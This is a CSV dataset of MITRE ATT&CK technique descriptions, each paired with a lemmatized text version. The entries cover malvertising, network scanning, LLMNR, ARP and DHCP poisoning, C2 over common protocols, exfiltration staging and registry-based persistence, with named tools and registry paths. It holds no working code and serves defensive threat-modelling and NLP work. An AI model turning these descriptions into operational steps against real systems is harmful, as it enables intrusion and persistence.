T1583.006,Acquire Infrastructure: Web Services,"Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control (Web Service), Exfiltration Over Web Service, or Phishing. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.",adversary register web service targeting variety popular website exist adversary register web base service abuse later stage adversary lifecycle command control web service exfiltration web service phishing common service offer google twitter make easy adversary hide expected noise utilize web service adversary difficult physically tie operation
T1583.007,Acquire Infrastructure: Serverless,"Adversaries may purchase and configure serverless cloud infrastructure, such as Cloudflare Workers or AWS Lambda functions, that can be used during targeting. By utilizing serverless infrastructure, adversaries can make it more difficult to attribute infrastructure used during operations back to them.Once acquired, the serverless runtime environment can be leveraged to either respond directly to infected machines or to Proxy traffic to an adversary-owned command and control server.",adversary purchase configure serverless cloud infrastructure cloudflare workers aws lambda function targeting utilize serverless infrastructure adversary difficult attribute infrastructure operation acquire serverless runtime environment leverage respond directly infect machine proxy traffic adversary own command control server
T1583.008,Acquire Infrastructure: Malvertising,"Adversaries may purchase online advertisements that can be abused to distribute malware to victims. Ads can be purchased to plant as well as favorably position artifacts in specific locations online, such as prominently placed within search engine results. These ads may make it more difficult for users to distinguish between actual search results and advertisements. Purchased ads may also target specific audiences using the advertising network’s capabilities, potentially further taking advantage of the trust inherently given to search engines and popular websites. Adversaries may purchase ads and other resources to help distribute artifacts containing malicious code to victims. Purchased ads may attempt to impersonate or spoof well-known brands. For example, these spoofed ads may trick victims into clicking the ad which could then send them to a malicious domain that may be a clone of official websites containing trojanized versions of the advertised software. Malvertising may be used to support Drive-by Target and Drive-by Compromise, potentially requiring limited interaction from the user if the ad contains code/exploits that infect the target system's web browser.Adversaries may also employ several techniques to evade detection by the advertising network. For example, adversaries may dynamically route ad clicks to send automated crawler/policy enforcer traffic to benign sites while validating potential targets then sending victims referred from real ad clicks to malicious pages. This infection vector may therefore remain hidden from the ad network as well as any visitor not reaching the malicious sites with a valid identifier from clicking on the advertisement.",adversary purchase online advertisement abuse distribute malware victim ad purchase plant favorably position artifact specific location online prominently place search engine result ad difficult user distinguish actual search result advertisement purchase ad target specific audience advertising network capability potentially take advantage trust inherently give search engine popular website adversary purchase ad resource help distribute artifact contain malicious code victim purchase ad attempt impersonate spoof know brand example spoofed ad trick victim click ad send malicious domain clone official website contain trojanize version advertise software malvertising support drive target drive compromise potentially require limited interaction user ad contain code exploit infect target system web browser adversary employ technique evade detection advertising network example adversary dynamically route ad click send automate crawler policy enforcer traffic benign site validate potential target send victim refer real ad click malicious page infection vector remain hidden ad network visitor reach malicious site valid identifier click advertisement
T1595,Active Scanning,"Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.Adversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services or Exploit Public-Facing Application).",adversary execute active reconnaissance scan gather information targeting active scan adversary probe victim infrastructure network traffic oppose form reconnaissance involve direct interaction adversary perform different form active scanning depend information seek gather scan perform way include native feature network protocol icmp information scan reveal opportunity form reconnaissance ex search open website domain search open technical database establish operational resource ex develop capability obtain capability initial access ex external remote service exploit public facing application
T1595.001,Active Scanning: Scanning IP Blocks,"Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.Adversaries may scan IP blocks in order to Gather Victim Network Information, such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: External Remote Services).",adversary scan victim ip block gather information targeting public ip address allocate organization block range sequential address adversary scan ip block order gather victim network information ip address actively use detailed information host assign address scan range simple ping icmp request response nuanced scan reveal host software version server banner network artifact information scan reveal opportunity form reconnaissance ex search open websites domain search open technical databases establish operational resource ex develop capability obtain capability initial access ex external remote services
T1595.002,Active Scanning: Vulnerability Scanning,"Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.These scans may also include more broad attempts to Gather Victim Host Information that can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts. Information from these scans may reveal opportunities for other forms of reconnaissance (ex: Search Open Websites/Domains or Search Open Technical Databases), establishing operational resources (ex: Develop Capabilities or Obtain Capabilities), and/or initial access (ex: Exploit Public-Facing Application).",adversary scan victim vulnerability targeting vulnerability scan typically check configuration target host application ex software version potentially align target specific exploit adversary seek use scan include broad attempt gather victim host information identify commonly know exploitable vulnerability vulnerability scan typically harvest run software version number server banner listening port network artifact information scan reveal opportunity form reconnaissance ex search open websites domain search open technical database establish operational resource ex develop capability obtain capability initial access ex exploit public facing application
T1595.003,Active Scanning: Wordlist Scanning,"Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods to Brute Force, its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex: Gather Victim Org Information, or Search Victim-Owned Websites).For example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website’s pages and directories. This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex: Exploit Public-Facing Application or Brute Force). As cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure. Once storage objects are discovered, adversaries may leverage Data from Cloud Storage to access valuable information that can be exfiltrated or used to escalate privileges and move laterally.",adversary iteratively probe infrastructure brute force crawl technique technique employ similar method brute force goal identification content infrastructure discovery valid credential wordlist scan contain generic commonly name file extension term specific particular software adversary create custom target specific wordlist datum gather reconnaissance technique ex gather victim org information search victim own example adversary use web content discovery tool dirb dirbuster gobuster generic custom wordlist enumerate website page directory help discover old vulnerable page hide administrative portal target operation ex exploit public facing application brute force cloud storage solution typically use globally unique name adversary use target specific wordlist tool gcpbucketbrute enumerate public private bucket cloud infrastructure storage object discover adversary leverage data cloud storage access valuable information exfiltrate escalate privilege laterally
T1557,Adversary-in-the-Middle,"Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation. By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.For example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.Adversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in Transmitted Data Manipulation. Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to Impair Defenses and/or in support of a Network Denial of Service.",adversary attempt position networked device adversary middle aitm technique support follow behavior network sniffing transmitted data manipulation abuse feature common networking protocol determine flow network traffic arp dns llmnr etc adversary force device communicate adversary control system collect information perform additional action example adversary manipulate victim dns setting enable malicious activity prevent redirect user access legitimate site push additional malware adversary leverage aitm position attempt monitor modify traffic transmitted data manipulation adversary setup position similar aitm prevent traffic flow appropriate destination potentially impair defenses support network denial service
T1557.001,Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay,"By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through Network Sniffing and crack the hashes offline through Brute Force to obtain the plaintext passwords.In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it. Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response. Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and Responder.",respond llmnr nbt ns network traffic adversary spoof authoritative source resolution force communication adversary control system activity collect relay authentication material link local multicast resolution llmnr netbios service nbt ns microsoft windows component serve alternate method host identification llmnr base domain system dns format allow host local link perform resolution host nbt ns identify system local network netbios adversary spoof authoritative source resolution victim network respond llmnr udp ns udp traffic know identity request host effectively poison service victim communicate adversary control system request host belong resource require identification authentication username hash send adversary control system adversary collect hash information send wire tool monitor port traffic network sniffing crack hash offline brute force obtain plaintext password case adversary access system authentication path system automated scan use credential attempt authenticate adversary control system hash intercept relay access execute code target system relay step happen conjunction poisoning independent additionally adversary encapsulate hash protocol ldap smb mssql http expand use multiple service valid ntlm response tool poison service local network nbnspoof metasploit responder
T1557.002,Adversary-in-the-Middle: ARP Cache Poisoning,"Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address. Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.",adversary poison address resolution protocol arp cache position communication networked device activity enable follow behavior network sniffing transmit data manipulation arp protocol resolve address link layer address medium access control mac address device local network segment communicate link layer address networked device link layer address particular networked device send broadcast arp request local network translate ip address mac address device associated ip address directly reply mac address networked device arp request use store information arp cache adversary passively wait arp request poison arp cache request device adversary reply mac address deceive victim make believe communicate intended network device adversary poison arp cache reply fast legitimate ip address owner adversary send gratuitous arp reply maliciously announce ownership particular ip address device local network segment arp protocol stateless require authentication device wrongly add update mac address ip address arp cache adversary use arp cache poisoning means intercept network traffic activity collect relay datum credential especially send insecure unencrypted protocol
T1557.003,Adversary-in-the-Middle: DHCP Spoofing,"Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.DHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients. The typical server-client interaction is as follows: The client broadcasts a DISCOVER message.The server responds with an OFFER message, which includes an available network address. The client broadcasts a REQUEST message, which includes the network address offered. The server acknowledges with an ACK message and the client receives the network configuration parameters.Adversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers. Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.DHCPv6 clients can receive network configuration information without being assigned an IP address by sending a INFORMATION-REQUEST (code 11) message to the All_DHCP_Relay_Agents_and_Servers multicast address. Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.Rather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, Service Exhaustion Flood) by generating many broadcast DISCOVER messages to exhaust a network’s DHCP allocation pool.",adversary redirect network traffic adversary own system spoof dynamic host configuration protocol dhcp traffic act malicious dhcp server victim network achieve adversary middle aitm position adversary collect network communication include pass credential especially send insecure unencrypted protocol enable follow behavior network sniffing transmit data manipulation dhcp base client server model functionality protocol provide network configuration setting dhcp server client mechanism allocate network address client typical server client interaction follow client broadcast discover message server respond offer message include available network address client broadcast request message include network address offer server acknowledge ack message client receive network configuration parameter adversary spoof rogue dhcp server victim network legitimate host receive malicious network configuration example malware act dhcp server provide adversary own dns server victimize computer malicious network configuration adversary achieve aitm position route client traffic adversary control system collect information client network client receive network configuration information assign ip address send information request code message multicast address adversary use rogue dhcp server respond request message malicious network configuration establish aitm position adversary abuse dhcp spoofing perform dhcp exhaustion attack service exhaustion flood generate broadcast discover message exhaust network dhcp allocation pool
T1071,Application Layer Protocol,"Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Adversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, or DNS. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP.",adversary communicate osi application layer protocol avoid detection network filtering blend existing traffic command remote system result command embed protocol traffic client server adversary utilize different protocol include web browsing transfer file electronic mail dns connection occur internally enclave proxy pivot node node commonly protocol smb ssh rdp
T1071.001,Application Layer Protocol: Web Protocols,"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as HTTP/S that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",adversary communicate application layer protocol associate web traffic avoid detection network filtering blend exist traffic command remote system result command embed protocol traffic client server protocol http s carry web traffic common environment http s packet field header datum conceal adversary abuse protocol communicate system control victim network mimic normal expected traffic
T1071.002,Application Layer Protocol: File Transfer Protocols,"Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as FTP, FTPS, and TFTP that transfer files may be very common in environments. Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",adversary communicate application layer protocol associate transfer file avoid detection network filtering blend existing traffic command remote system result command embed protocol traffic client server protocol ftp ftps tftp transfer file common environment packet produce protocol field header datum conceal datum conceal transfer file adversary abuse protocol communicate system control victim network mimic normal expected traffic
T1071.003,Application Layer Protocol: Mail Protocols,"Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. Protocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments. Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",adversary communicate application layer protocol associate electronic mail delivery avoid detection network filtering blend existing traffic command remote system result command embed protocol traffic client server protocol smtp s s imap carry electronic mail common environment packet produce protocol field header datum conceal datum conceal email message adversary abuse protocol communicate system control victim network mimic normal expected traffic
T1071.004,Application Layer Protocol: DNS,"Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. The DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",adversary communicate domain system dns application layer protocol avoid detection network filtering blend existing traffic command remote system result command embed protocol traffic client server dns protocol serve administrative function computer networking common environment dns traffic allow network authentication complete dns packet contain field header datum conceal know dns tunneling adversary abuse dns communicate system control victim network mimic normal expected traffic
T1010,Application Window Discovery,"Adversaries may attempt to get a listing of open application windows. Window listings could convey information about how the system is used.Adversaries typically abuse system features for this type of enumeration. For example, they may gather information through native system features such as Command and Scripting Interpreter commands and Native API functions.",adversary attempt listing open application window window listing convey information system adversary typically abuse system feature type enumeration example gather information native system feature command scripting interpreter command native api function
T1560,Archive Collected Data,"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network. Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender.Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",adversary compress encrypt datum collect prior exfiltration compress datum help obfuscate collect datum minimize datum send network encryption hide information exfiltrate detection exfiltration conspicuous inspection defender compression encryption prior exfiltration perform utility party library custom method
T1560.001,Archive Collected Data: Archive via Utility,"Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport.Adversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as tar on Linux and macOS or zip on Windows systems. On Windows, diantz or makecab may be used to package collected files into a cabinet (.cab) file. diantz may also be used to download and compress files from remote locations (i.e. Remote Data Staging). xcopy on Windows can copy files and directories with a variety of options. Additionally, adversaries may use certutil to Base64 encode collected data before exfiltration. Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.",adversary use utility compress encrypt collect datum prior exfiltration utility include functionality compress encrypt package datum format easy secure transport adversary abuse utility compress encrypt datum exfiltration party utility preinstalle tar linux macos zip windows system windows diantz makecab package collect file cabinet file diantz download compress file remote location remote data staging xcopy windows copy file directory variety option additionally adversary use certutil encode collect datum exfiltration adversary use party utility zip winrar winzip perform similar activity
T1560.002,Archive Collected Data: Archive via Library,"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including Python rarfile . Most libraries include functionality to encrypt and/or compress data.Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",adversary compress encrypt datum collect prior exfiltration party library library exist archive datum include python rarfile library include functionality encrypt compress datum archival library preinstalle system macos linux zip windows note library different utility library link compile utility require spawn subshell similar execution mechanism
T1560.003,Archive Collected Data: Archive via Custom Method,"An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.",adversary compress encrypt datum collect prior exfiltration custom method adversary choose use custom archival method encryption xor stream cipher implement external library utility reference custom implementation know compression algorithm
T1123,Audio Capture,"An adversary can leverage a computer's peripheral devices (e.g., microphones and webcams) or applications (e.g., voice and video call services) to capture audio recordings for the purpose of listening into sensitive conversations to gather information.Malware or scripts may be used to interact with the devices through an available API provided by the operating system or an application to capture audio. Audio files may be written to disk and exfiltrated later.",adversary leverage computer peripheral device microphone webcam application voice video service capture audio recording purpose listen sensitive conversation gather information malware script interact device available api provide operate system application capture audio audio file write disk exfiltrate later
T1119,Automated Collection,"Once established within a system or network, an adversary may use automated techniques for collecting internal data. Methods for performing this technique could include use of a Command and Scripting Interpreter to search for and copy information fitting set criteria such as file type, location, or name at specific time intervals. In cloud-based environments, adversaries may also use cloud APIs, command line interfaces, or extract, transform, and load (ETL) services to automatically collect data. This functionality could also be built into remote access tools. This technique may incorporate use of other techniques such as File and Directory Discovery and Lateral Tool Transfer to identify and move files, as well as Cloud Service Dashboard and Cloud Storage Object Discovery to identify resources in cloud environments.",establish system network adversary use automate technique collect internal datum method perform technique include use command scripting interpreter search copy information fit set criterion file type location specific time interval cloud base environment adversary use cloud api command line interface extract transform load etl service automatically collect datum functionality build remote access tool technique incorporate use technique file directory discovery lateral tool transfer identify file cloud service dashboard cloud storage object discovery identify resource cloud environment
T1020,Automated Exfiltration,"Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. When automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.",adversary exfiltrate datum sensitive document use automate processing gather collection automated exfiltration exfiltration technique likely apply transfer information network exfiltration channel exfiltration alternative protocol
T1020.001,Automated Exfiltration: Traffic Duplication,"Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through ROMMONkit or Patch System Image.Many cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.Adversaries may use traffic duplication in conjunction with Network Sniffing, Input Capture, or Adversary-in-the-Middle depending on the goals and objectives of the adversary.",adversary leverage traffic mirroring order automate data exfiltration compromised infrastructure traffic mirroring native feature device network analysis example device configure forward network traffic destination analysis network analyzer monitor device adversary abuse traffic mirroring mirror redirect network traffic infrastructure control malicious modification network device enable traffic redirection possible rommonkit patch system image cloud base environment support traffic mirroring example aws traffic mirroring gcp packet mirroring azure vtap allow user define specify instance collect traffic specified target send collect traffic adversary use traffic duplication conjunction network sniffing input capture adversary middle depend goal objective adversary
T1197,BITS Jobs,"Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM). BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.The interface to create and manage BITS jobs is accessible through PowerShell and the BITSAdmin tool.Adversaries may abuse BITS to download (e.g. Ingress Tool Transfer), execute, and even clean up after running malicious code (e.g. Indicator Removal). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.BITS upload functionalities can also be used to perform Exfiltration Over Alternative Protocol.",adversary abuse bits job persistently execute code perform background task windows background intelligent transfer service bits low bandwidth asynchronous file transfer mechanism expose component object model com bits commonly updater messenger application prefer operate background available idle bandwidth interrupt networked application file transfer task implement bits job contain queue file operation interface create manage bits job accessible powershell bitsadmin tool adversary abuse bits download ingress tool transfer execute clean run malicious code indicator removal bits task self contained bits job database new file registry modification permit host firewall bits upload functionality perform exfiltration alternative protocol
T1547,Boot or Logon Autostart Execution,"Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon. These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.",adversary configure system setting automatically execute program system boot logon maintain persistence gain high level privilege compromised system operate system mechanism automatically run program system boot account logon mechanism include automatically execute program place specially designate directory reference repository store configuration information windows registry adversary achieve goal modify extend feature kernel boot logon autostart program run high privilege adversary leverage elevate privilege
T1547.001,Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in. These programs will be executed under the context of the user and will have the account's associated permissions level.Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is C:\Users\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup. The startup folder path for all users is C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp.The following run keys are created by default on Windows systems:HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceRun keys may exist under multiple hives.The following Registry keys can be used to set startup folder items for persistence:HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell FoldersThe following Registry keys can control automatic startup of services during boot:HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesUsing policy settings to specify startup programs creates corresponding values in either of two Registry keys:HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\RunThe Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit and HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell subkeys can automatically launch programs.Programs listed in the load value of the registry key HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows run when any user logs on.By default, the multistring BootExecute value of the registry key HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager is set to autocheck autochk *. This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use Masquerading to make the Registry entries look as if they are associated with legitimate programs.",adversary achieve persistence add program startup folder reference registry run key add entry run key registry startup folder cause program reference execute user log program execute context user account associate permission level place program startup folder cause program execute user log startup folder location individual user account system wide startup folder check regardless user account log startup folder path current user startup folder path user following run key create default windows system key exist multiple hive following registry key set startup folder item persistence shell folders folders folders shell foldersthe following registry key control automatic startup service boot policy setting specify startup program create corresponding value registry key winlogon key control action occur user log computer run windows action control operate system add custom action subkey automatically launch program program list load value registry key run user log default multistring bootexecute value registry key manager set autocheck autochk value cause windows startup check file system integrity hard disk system shut abnormally adversary add program process registry value automatically launch boot adversary use configuration location execute malware remote access tool maintain persistence system reboot adversary use masquerading registry entry look associate legitimate program
T1547.002,Boot or Logon Autostart Execution: Authentication Package,"Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.Adversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ with the key value of ""Authentication Packages""=<target binary>. The binary will then be executed by the system when the authentication packages are loaded.",adversary abuse authentication package execute dll system boot windows authentication package dll load local security authority lsa process system start provide support multiple logon process multiple security protocol operate system adversary use autostart mechanism provide lsa authentication package persistence place reference binary windows registry location key value authentication binary binary execute system authentication package load
T1547.003,Boot or Logon Autostart Execution: Time Providers,"Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\W32Time\TimeProviders\.Adversaries may abuse this architecture to establish persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.",adversary abuse time provider execute dll system boot windows time service enable time synchronization domain time provider implement dynamic link library dll register subkey abuse architecture establish persistence specifically register enable malicious dll time provider administrator privilege require time provider registration execution run context local service account
